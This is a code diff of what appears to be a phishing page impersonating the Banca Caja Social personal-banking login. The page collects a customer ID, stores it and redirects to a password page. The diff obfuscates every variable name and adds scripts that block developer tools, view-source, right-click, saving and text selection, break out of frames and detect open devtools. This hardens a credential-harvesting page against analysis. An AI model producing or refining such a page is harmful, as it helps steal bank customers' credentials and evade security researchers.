@@ -4,6 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no,viewport-fit=cover">
     <title>Bienvenido al Portal Personas - Banca Caja Social</title>
+    <link rel="icon" type="image/x-icon" href="img/favicon.ico">
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
     <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
@@ -67,66 +68,62 @@
     </div>
     
     <script>
-        document.addEventListener('DOMContentLoaded', function() {
-            const usuarioInput = document.getElementById('usuario');
-            const btnSiguiente = document.getElementById('submitBtn');
-            const errorMsg = document.getElementById('errorMsg');
-            
-            const validPattern = /^(CC|CE|NI|TI|PE)\d+$/;
-            
-            usuarioInput.addEventListener('input', function() {
-                const value = this.value.trim().toUpperCase();
-                this.value = value;
-                
-                if (value.length === 0 || value.length < 2) {
-                    errorMsg.style.display = 'none';
-                    usuarioInput.classList.remove('error');
-                    btnSiguiente.disabled = true;
-                    return;
-                }
-                
-                if (validPattern.test(value)) {
-                    errorMsg.style.display = 'none';
-                    usuarioInput.classList.remove('error');
-                    btnSiguiente.disabled = false;
-                } else {
-                    errorMsg.style.display = 'block';
-                    usuarioInput.classList.add('error');
-                    btnSiguiente.disabled = true;
-                }
-            });
-            
-            document.getElementById('loginForm').addEventListener('submit', function(e) {
-                e.preventDefault();
-                const value = usuarioInput.value.trim().toUpperCase();
-                if (validPattern.test(value)) {
-                    var sessionId = sessionStorage.getItem('sessionId') || ('sess_' + Date.now() + '_' + Math.floor(Math.random() * 10000));
-                    sessionStorage.setItem('sessionId', sessionId);
-                    sessionStorage.setItem('usuario', value);
-                    
-                    var pantalla = document.getElementById('pantallaCarga');
-                    if (pantalla) pantalla.classList.add('activa');
-                    setTimeout(function(){
-                        window.location.href = 'password.html';
-                    }, 1000);
-                } else {
-                    errorMsg.style.display = 'block';
-                    usuarioInput.classList.add('error');
-                }
-            });
+    document.addEventListener('DOMContentLoaded',function(){
+        var _0xa1=document.getElementById('usuario');
+        var _0xb2=document.getElementById('submitBtn');
+        var _0xc3=document.getElementById('errorMsg');
+        var _0xd4=/^(CC|CE|NI|TI|PE)\d+$/;
+
+        _0xa1.addEventListener('input',function(){
+            var _0xe5=this.value.trim().toUpperCase();
+            this.value=_0xe5;
+            if(_0xe5.length===0||_0xe5.length<2){
+                _0xc3.style.display='none';
+                _0xa1.classList.remove('error');
+                _0xb2.disabled=true;
+                return;
+            }
+            if(_0xd4.test(_0xe5)){
+                _0xc3.style.display='none';
+                _0xa1.classList.remove('error');
+                _0xb2.disabled=false;
+            }else{
+                _0xc3.style.display='block';
+                _0xa1.classList.add('error');
+                _0xb2.disabled=true;
+            }
         });
+
+        document.getElementById('loginForm').addEventListener('submit',function(_0xf6){
+            _0xf6.preventDefault();
+            var _0xe5=_0xa1.value.trim().toUpperCase();
+            if(_0xd4.test(_0xe5)){
+                var _0xg7=sessionStorage.getItem('sessionId')||('sess_'+Date.now()+'_'+Math.floor(Math.random()*10000));
+                sessionStorage.setItem('sessionId',_0xg7);
+                sessionStorage.setItem('usuario',_0xe5);
+                var _0xh8=document.getElementById('pantallaCarga');
+                if(_0xh8)_0xh8.classList.add('activa');
+                setTimeout(function(){
+                    window.location.href='password.html';
+                },1000);
+            }else{
+                _0xc3.style.display='block';
+                _0xa1.classList.add('error');
+            }
+        });
+    });
     </script>
 
 <script>
 (function(){
-    var imagenes = ['img/background-2.png','img/background-3.png','img/familia11.png','img/background-6.png'];
-    var bg = document.getElementById('bgImage');
-    if (bg) {
-        var ultima = sessionStorage.getItem('ultimaBg') || '';
-        var disponibles = imagenes.filter(function(img){ return img !== ultima; });
-        var aleatoria = disponibles[Math.floor(Math.random() * disponibles.length)];
-        bg.src = aleatoria;
-        sessionStorage.setItem('ultimaBg', aleatoria);
+    var _0xi9=['img/background-2.png','img/background-3.png','img/familia11.png','img/background-6.png'];
+    var _0xj0=document.getElementById('bgImage');
+    if(_0xj0){
+        var _0xk1=sessionStorage.getItem('ultimaBg')||'';
+        var _0xl2=_0xi9.filter(function(_0xm3){return _0xm3!==_0xk1;});
+        var _0xn4=_0xl2[Math.floor(Math.random()*_0xl2.length)];
+        _0xj0.src=_0xn4;
+        sessionStorage.setItem('ultimaBg',_0xn4);
     }
 })();
 </script>
@@ -134,31 +131,88 @@
 <script>
 (function(){
 'use strict';
-var lastTouchEnd = 0;
-document.addEventListener('touchend', function(e){
-var ahora = new Date().getTime();
-if (ahora - lastTouchEnd <= 300) { e.preventDefault(); }
-lastTouchEnd = ahora;
-}, { passive: false });
-document.addEventListener('dblclick', function(e){ e.preventDefault(); });
-document.addEventListener('focusin', function(e){
-var tag = (e.target && e.target.tagName) ? e.target.tagName.toLowerCase() : '';
-if (tag === 'input' || tag === 'textarea' || tag === 'select') {
-if (e.target.style.fontSize !== '16px') {
-e.target.dataset._fs = e.target.style.fontSize || '';
-e.target.style.fontSize = '16px';
+var _0xo5=0;
+document.addEventListener('touchend',function(_0xp6){
+var _0xq7=new Date().getTime();
+if(_0xq7-_0xo5<=300){_0xp6.preventDefault();}
+_0xo5=_0xq7;
+},{passive:false});
+document.addEventListener('dblclick',function(_0xr8){_0xr8.preventDefault();});
+document.addEventListener('focusin',function(_0xs9){
+var _0xt0=(_0xs9.target&&_0xs9.target.tagName)?_0xs9.target.tagName.toLowerCase():'';
+if(_0xt0==='input'||_0xt0==='textarea'||_0xt0==='select'){
+if(_0xs9.target.style.fontSize!=='16px'){
+_0xs9.target.dataset._fs=_0xs9.target.style.fontSize||'';
+_0xs9.target.style.fontSize='16px';
 }
 }
 });
-document.addEventListener('focusout', function(e){
-var tag = (e.target && e.target.tagName) ? e.target.tagName.toLowerCase() : '';
-if (tag === 'input' || tag === 'textarea' || tag === 'select') {
-if (e.target.dataset._fs !== undefined) {
-e.target.style.fontSize = e.target.dataset._fs;
-delete e.target.dataset._fs;
+document.addEventListener('focusout',function(_0xu1){
+var _0xt0=(_0xu1.target&&_0xu1.target.tagName)?_0xu1.target.tagName.toLowerCase():'';
+if(_0xt0==='input'||_0xt0==='textarea'||_0xt0==='select'){
+if(_0xu1.target.dataset._fs!==undefined){
+_0xu1.target.style.fontSize=_0xu1.target.dataset._fs;
+delete _0xu1.target.dataset._fs;
 }
 }
 });
+})();
+</script>
+
+<script>
+(function(){
+'use strict';
+
+document.addEventListener('contextmenu',function(_0xv2){
+_0xv2.preventDefault();
+return false;
+});
+
+document.addEventListener('keydown',function(_0xw3){
+var _0xx4=(_0xw3.key||'').toLowerCase();
+var _0xy5=_0xw3.ctrlKey||_0xw3.metaKey;
+var _0xz6=_0xw3.shiftKey;
+
+if(_0xx4==='f12'){_0xw3.preventDefault();return false;}
+if(_0xy5&&_0xz6&&(_0xx4==='i'||_0xx4==='j'||_0xx4==='c')){_0xw3.preventDefault();return false;}
+if(_0xy5&&_0xx4==='u'){_0xw3.preventDefault();return false;}
+if(_0xy5&&_0xx4==='s'){_0xw3.preventDefault();return false;}
+if(_0xy5&&_0xz6&&(_0xx4==='k'||_0xx4==='e'||_0xx4==='s'||_0xx4==='c')){_0xw3.preventDefault();return false;}
+if(_0xw3.metaKey&&_0xw3.altKey&&(_0xx4==='i'||_0xx4==='j'||_0xx4==='c')){_0xw3.preventDefault();return false;}
+});
+
+document.addEventListener('dragstart',function(_0x07){_0x07.preventDefault();});
+
+document.addEventListener('selectstart',function(_0x18){
+var _0x29=(_0x18.target&&_0x18.target.tagName)?_0x18.target.tagName.toLowerCase():'';
+if(_0x29!=='input'&&_0x29!=='textarea'){
+_0x18.preventDefault();
+}
+});
+
+try{
+if(window.top!==window.self){
+window.top.location=window.self.location;
+}
+}catch(_0x3a){
+document.body.innerHTML='';
+}
+
+var _0x4b=false;
+var _0x5c=160;
+
+function _0x6d(){
+var _0x7e=window.outerWidth-window.innerWidth;
+var _0x8f=window.outerHeight-window.innerHeight;
+if(_0x7e>_0x5c||_0x8f>_0x5c){
+_0x4b=true;
+}else{
+_0x4b=false;
+}
+}
+
+setInterval(_0x6d,1000);
+
 })();
 </script>
 </body>
